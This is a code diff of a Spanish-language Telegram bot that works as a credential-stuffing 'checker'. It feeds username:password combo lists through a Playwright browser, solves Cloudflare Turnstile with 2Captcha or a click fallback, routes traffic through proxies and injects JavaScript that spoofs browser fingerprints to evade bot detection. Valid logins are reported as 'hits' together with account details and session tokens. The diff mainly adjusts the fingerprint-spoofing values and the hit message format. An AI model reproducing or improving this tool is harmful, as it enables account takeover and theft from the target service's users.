@@ -34,9 +34,9 @@ bot_state = {"running": False, "current_chat": None, "_start_time": None, "_proc
 def get_proxy_conf():
     return {"server": f"http://{PROXY['host']}:{PROXY['port']}", "username": PROXY["user"], "password": PROXY["pass"]}
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  2CAPTCHA API (urllib — sin dependencia extra)
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def captcha_balance():
     try:
@@ -199,9 +199,9 @@ def solve_cf_2captcha(page, chat_id=None):
             tg_send_msg(chat_id, f"⚠️ 2Captcha: <code>{esc(str(e)[:100])}</code>\nFallback a click...", disable_notification=True)
         return solve_turnstile_click(page)
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  TURNSTILE CLICK (FALLBACK)
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def solve_turnstile_click(page, max_a=6):
     for att in range(1, max_a + 1):
@@ -240,9 +240,9 @@ def solve_turnstile_click(page, max_a=6):
         page.wait_for_timeout(2000)
     return False
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  TELEGRAM API
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def tg_api(method, params=None, files=None, timeout=30):
     url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
@@ -314,9 +314,9 @@ def kb_main():
 def kb_cancel():
     return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  DEPS
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def run_cmd(cmd, timeout=300):
     try:
@@ -376,9 +376,9 @@ def get_captcha_img(page):
     except: pass
     return None
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  STEALTH JS
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 STEALTH_JS = """
 Object.defineProperty(navigator,'webdriver',{get:()=>undefined});delete navigator.__proto__.webdriver;
@@ -387,20 +387,20 @@ Object.defineProperty(navigator,'vendor',{get:()=>'Google Inc.'});Object.defineP
 Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});Object.defineProperty(navigator,'deviceMemory',{get:()=>4});
 Object.defineProperty(navigator,'languages',{get:()=>['es-ES','es','en-US','en']});Object.defineProperty(navigator,'language',{get:()=>'es-ES'});
 window.chrome={runtime:{},loadTimes:function(){},csi:function(){},app:{}};
-Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai',description:'',length:1},{name:'Native Client',filename:'internal-nacl-plugin',description:'',length:2}];p.refresh=function(){};return p}});
+Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1}];p.refresh=function(){};return p}});
 Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf'},{type:'application/x-nacl',suffixes:''},{type:'application/x-pnacl',suffixes:''}];m.refresh=function(){};return m}});
 const oq=window.navigator.permissions.query;window.navigator.permissions.query=(p)=>p.name==='notifications'?Promise.resolve({state:Notification.permission}):oq(p);
-const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return['WebGL 1.0 (OpenGL ES 2.0 Chromium)'];return gp.call(this,p)};
-Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){},dispatchEvent:function(){return true}})});
-Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>872});Object.defineProperty(screen,'colorDepth',{get:()=>24});
+const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return'WebGL';return gp.call(this,p)};
+Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){}})});
+Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>873});
 Object.defineProperty(window,'devicePixelRatio',{get:()=>2.625});Object.defineProperty(window,'innerWidth',{get:()=>412});Object.defineProperty(window,'innerHeight',{get:()=>872});
 window._mx=200;window._my=400;document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY});
 try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this)}catch(e){return null}}})}catch(e){}
 """
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  CF HANDLER (2CAPTCHA PRIMERO, CLICK FALLBACK)
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def _has_login(page):
     try:
@@ -434,9 +434,9 @@ def handle_cf(page, chat_id=None):
         if _has_login(page): return True
     return False
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  HELPERS
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def clear_auth(ctx):
     try:
@@ -506,9 +506,9 @@ def update_progress(chat_id, msg_id, acc, res, st):
             reply_markup=kb_cancel())
     except: pass
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  DIAGNÓSTICO
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def test_cf(chat_id):
     from playwright.sync_api import sync_playwright
@@ -585,9 +585,9 @@ def test_cf(chat_id):
     except Exception as e:
         tg_send_msg(chat_id, f"❌ <code>{esc(str(e)[:200])}</code>")
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  MOTOR
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
     from playwright.sync_api import sync_playwright
@@ -807,7 +807,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                     rev="✅" if info.get("is_revendedor") else "❌";sup="✅" if info.get("is_super") else "❌"
                     hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
                     hits_lines.append(f"{user}:{pwd}");stats["hits"]+=1
-                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 T:{dash.get('sumNum',0)} A:{dash.get('activeNum',0)}"
+                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 T:{dash.get('plan_code','—')} │ V:{dash.get('valid_days','—')} d\n💎 {dash.get('stars','—')} ⭐"
                     update_progress(chat_id,msg_id,user,f"💰 HIT! Rev={rev}",stats)
                     try:tg_send_msg(chat_id,detail,disable_notification=True)
                     except:pass
@@ -828,9 +828,9 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
         except:pass
     return hits,hits_lines
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  START CHECK
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 waiting_combo = set()
 
@@ -854,15 +854,18 @@ def start_check(accounts, chat_id, use_proxy=True):
             if pmid:tg_edit_msg(chat_id,pmid,s,reply_markup=kb_main())
             else:tg_send_msg(chat_id,s,reply_markup=kb_main())
         except Exception as e:
-            print(f"  [✗] {e}");try:tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
-            except:pass
+            print(f"  [✗] {e}")
+            try:
+                tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
+            except:
+                pass
 
     pr=multiprocessing.Process(target=worker,args=(accounts,chat_id,pmid,use_proxy),daemon=True)
     pr.start();bot_state["_process"]=pr
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  UPDATES
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def process_update(upd):
     global ADMIN_IDS
@@ -921,9 +924,9 @@ def process_update(upd):
             else:tg_answer_cb(cbq["id"],"Nada",show_alert=True)
         elif data=="cancel_check":waiting_combo.discard(cid);tg_edit_msg(cid,mid,"🎬 Listo.",reply_markup=kb_main());tg_answer_cb(cbq["id"])
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  MAIN
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def main():
     print("\n  ╔═══════════════════════════════════════════════════╗")
